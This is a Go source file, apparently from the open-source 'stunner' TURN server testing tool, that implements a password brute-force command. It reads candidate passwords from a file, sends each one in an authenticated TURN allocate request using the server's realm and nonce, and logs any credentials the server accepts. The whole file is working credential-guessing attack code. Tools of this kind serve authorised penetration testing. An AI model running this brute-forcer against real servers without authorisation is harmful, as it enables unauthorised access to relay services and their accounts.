package cmd

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/firefart/stunner/internal"
	"github.com/sirupsen/logrus"
)

type BruteforceOpts struct {
	TurnServer string
	Protocol   string
	Username   string
	Passfile   string
	UseTLS     bool
	Timeout    time.Duration
	Log        *logrus.Logger
}

func (opts BruteforceOpts) Validate() error {
	if opts.TurnServer == "" {
		return fmt.Errorf("need a valid turnserver")
	}
	if !strings.Contains(opts.TurnServer, ":") {
		return fmt.Errorf("turnserver needs a port")
	}
	if opts.Protocol != "tcp" && opts.Protocol != "udp" {
		return fmt.Errorf("protocol needs to be either tcp or udp")
	}
	if opts.Username == "" {
		return fmt.Errorf("please supply a username")
	}
	if opts.Passfile == "" {
		return fmt.Errorf("please supply a password file")
	}
	if opts.Log == nil {
		return fmt.Errorf("please supply a valid logger")
	}
	return nil
}

func BruteForce(opts BruteforceOpts) error {
	if err := opts.Validate(); err != nil {
		return err
	}

	pfile, err := os.Open(opts.Passfile)
	if err != nil {
		return fmt.Errorf("could not read password file: %w", err)
	}
	defer pfile.Close()

	scanner := bufio.NewScanner(pfile)
	for scanner.Scan() {
		if err := testPassword(opts, scanner.Text()); err != nil {
			return err
		}
	}

	if err := scanner.Err(); err != nil {
		return err
	}
	return nil
}

func testPassword(opts BruteforceOpts, password string) error {
	conn, err := internal.Connect(opts.Protocol, opts.TurnServer, opts.UseTLS, opts.Timeout)
	if err != nil {
		return fmt.Errorf("could not connect to %s: %w", opts.TurnServer, err)
	}
	x := internal.RequestedTransport(1)
	allocateRequest := internal.AllocateRequest(x, internal.AllocateProtocolIgnore)
	allocateResponse, err := allocateRequest.SendAndReceive(opts.Log, conn, opts.Timeout)
	if err != nil {
		return fmt.Errorf("error on sending allocate request: %w", err)
	}
	realm := string(allocateResponse.GetAttribute(internal.AttrRealm).Value)
	nonce := string(allocateResponse.GetAttribute(internal.AttrNonce).Value)

	allocateRequest = internal.AllocateRequestAuth(opts.Username, password, nonce, realm, x, internal.AllocateProtocolIgnore)
	allocateResponse, err = allocateRequest.SendAndReceive(opts.Log, conn, opts.Timeout)
	if err != nil {
		opts.Log.Errorf("error on sending allocate request: %s", err)
		return nil
	}
	if allocateResponse.Header.MessageType.Class != internal.MsgTypeClassSuccess {
		errorCode := allocateResponse.GetAttribute(internal.AttrErrorCode).Value[4:]
		if string(errorCode) == "Unauthorized" {
			opts.Log.Warnf("[!] %s:%s credentials are incorrect", opts.Username, password)
		} else {
			opts.Log.Errorf("Unknown error: %s", string(errorCode))
		}
		return nil
	}
	opts.Log.Infof("Found valid credentials: %s:%s", opts.Username, password)
	return nil
}
